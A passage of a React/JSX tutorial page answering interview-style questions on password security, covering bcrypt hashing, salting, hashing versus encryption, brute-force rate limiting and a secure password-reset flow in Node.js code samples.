// Rule of thumb: target ~300ms on your production hardware

// Timing: bcrypt.hash() uses libuv thread pool — non-blocking
const hash = await bcrypt.hash(password, 12); // async — main thread free
// bcrypt.hashSync() — BLOCKS the event loop! Never use in production servers

// Output format (cost=12, built-in salt embedded):
// $2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8CmWQ9GqmCqd4mEUqRi
//     ^^                                         ←──────────────────
//     cost                                       salt (22 chars) + hash`}</code>
      </pre>

      {/* ─── Q22 ─── */}
      <h2 id="salting">What is salting?</h2>
      <p>
        A salt is a unique random value added to each password before hashing. Without salting,
        two users with the same password produce the same hash — attackers can use precomputed
        rainbow tables to crack all matching hashes at once. With salting, each hash is unique
        even for identical passwords.
      </p>
      <pre>
        <code>{`// Without salt — rainbow table attack works:
hash("password123") → "abc123"  // precomputed in attacker's table
hash("password123") → "abc123"  // same for every user with this password

// Attacker looks up "abc123" → instantly knows password is "password123"
// and now knows ALL users with that hash use the same password

// With unique salt per user — rainbow tables useless:
hash("password123" + "salt-alice-xyz") → "q9w8e7r6..."  // unique to Alice
hash("password123" + "salt-bob-abc")   → "z1x2c3v4..."  // unique to Bob
// Attacker must crack each one separately — no bulk precomputation

// bcrypt generates and embeds the salt automatically:
const hash1 = await bcrypt.hash("password123", 12);
const hash2 = await bcrypt.hash("password123", 12);
console.log(hash1 === hash2); // false — different salts, different hashes
// The salt is stored embedded in the hash — bcrypt.compare() extracts it automatically`}</code>
      </pre>

      {/* ─── Q23 ─── */}
      <h2 id="hashing-vs-encryption">What is the difference between hashing and encryption?</h2>
      <ArticleTable caption="One-way vs two-way — the direction determines which to use" minWidth={820}>
        <table>
          <thead>
            <tr>
              <th></th>
              <th>Hashing</th>
              <th>Encryption</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>Direction</strong></td>
              <td>One-way — cannot be reversed</td>
              <td>Two-way — can decrypt with the key</td>
            </tr>
            <tr>
              <td><strong>Purpose</strong></td>
              <td>Verify data integrity / store secrets you never need to see again</td>
              <td>Store data you need to retrieve in original form</td>
            </tr>
            <tr>
              <td><strong>Key required?</strong></td>
              <td>No key — deterministic function</td>
              <td>Yes — secret key or key pair</td>
            </tr>
            <tr>
              <td><strong>Use for passwords?</strong></td>
              <td>✅ Yes — bcrypt, Argon2, scrypt</td>
              <td>❌ No — if key leaks, all passwords exposed</td>
            </tr>
            <tr>
              <td><strong>Use for PII (SSN, credit cards)?</strong></td>
              <td>❌ No — you need to retrieve the value</td>
              <td>✅ Yes — AES-256 at rest</td>
            </tr>
            <tr>
              <td><strong>Algorithms</strong></td>
              <td>bcrypt, Argon2, SHA-256, MD5 (weak)</td>
              <td>AES-256-GCM, RSA, ChaCha20</td>
            </tr>
          </tbody>
        </table>
      </ArticleTable>

      {/* ─── Q24 ─── */}
      <h2 id="brute-force">How do you protect against brute-force login attempts?</h2>
      <pre>
        <code>{`// Layer 1: Rate limiting on the login endpoint
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10,                   // 10 attempts per IP per 15 min
  store: new RedisStore({ client: redis }),
  keyGenerator: (req) => req.ip,
  message: { error: { message: "Too many login attempts", code: "RATE_LIMITED" } },
});
app.post("/auth/login", loginLimiter, login);

// Layer 2: Exponential backoff per account (not just per IP)
// Track failed attempts in Redis per email
async function trackFailedLogin(email: string) {
  const key = \`login:fails:\${email}\`;
  const fails = await redis.incr(key);
  await redis.expire(key, 15 * 60); // reset window after 15 min
  return fails;
}

app.post("/auth/login", asyncHandler(async (req, res) => {
  const { email, password } = req.body;
  const fails = await redis.get(\`login:fails:\${email}\`);
  if (fails && parseInt(fails) >= 10) {
    throw new AppError(429, "Account temporarily locked — too many failed attempts");
  }

  const user = await db.user.findUnique({ where: { email } });
  const valid = await bcrypt.compare(password, user?.passwordHash ?? "$2b$12$dummy");

  if (!user || !valid) {
    await trackFailedLogin(email);
    throw new UnauthorizedError("Invalid email or password");
  }

  await redis.del(\`login:fails:\${email}\`); // reset on success
  // issue tokens...
}));

// Layer 3: CAPTCHA after N failures
// Layer 4: Notify user of login attempt via email
// Layer 5: IP reputation / suspicious IP blocking (Cloudflare, etc.)`}</code>
      </pre>

      {/* ─── Q25 ─── */}
      <h2 id="password-reset">How do you handle password reset securely?</h2>
      <MermaidDiagram
        chart={passwordResetDiagram}
        title="Secure Password Reset Flow"
        caption="The reset token is a random opaque value — never the user's ID or email. It is hashed before storage (same reason as passwords). One-time use only."
        minHeight={580}
      />
      <pre>
        <code>{`// The critical security rules for password reset:

// Rule 1: Never reveal if an email exists — always return same message
app.post("/auth/forgot-password", asyncHandler(async (req, res) => {
  const { email } = req.body;
  const user = await db.user.findUnique({ where: { email } });

  // Do the work even if user doesn't exist (prevents email enumeration)
  if (user) {
    const rawToken = crypto.randomBytes(32).toString("hex"); // 256 bits — unguessable
    const tokenHash = crypto.createHash("sha256").update(rawToken).digest("hex");

    await db.passwordReset.create({
      data: { userId: user.id, tokenHash, expiresAt: new Date(Date.now() + 3_600_000) },
    });

    await emailService.sendReset(email, \`https://app.com/reset?token=\${rawToken}\`);
  }

  // Same response regardless of whether user exists
  res.json({ message: "If that email is registered, you'll receive a reset link" });
}));

// Rule 2: One-time use, short expiry, hash the token
app.post("/auth/reset-password", asyncHandler(async (req, res) => {
  const { token, newPassword } = req.body;

  const tokenHash = crypto.createHash("sha256").update(token).digest("hex");
  const reset = await db.passwordReset.findFirst({
    where: { tokenHash, used: false, expiresAt: { gt: new Date() } },
  });
  if (!reset) throw new AppError(400, "Invalid or expired reset token");

  await db.$transaction([
    db.user.update({
      where: { id: reset.userId },
      data: { passwordHash: await bcrypt.hash(newPassword, 12) },
    }),
    db.passwordReset.update({ where: { id: reset.id }, data: { used: true } }),
    db.refreshToken.updateMany({ where: { userId: reset.userId }, data: { revoked: true } }),
  ]);
  // User must log in again — all existing sessions invalidated

  res.json({ message: "Password updated. Please log in with your new password." });
}));`}</code>
      </pre>
    </div>
  );
}
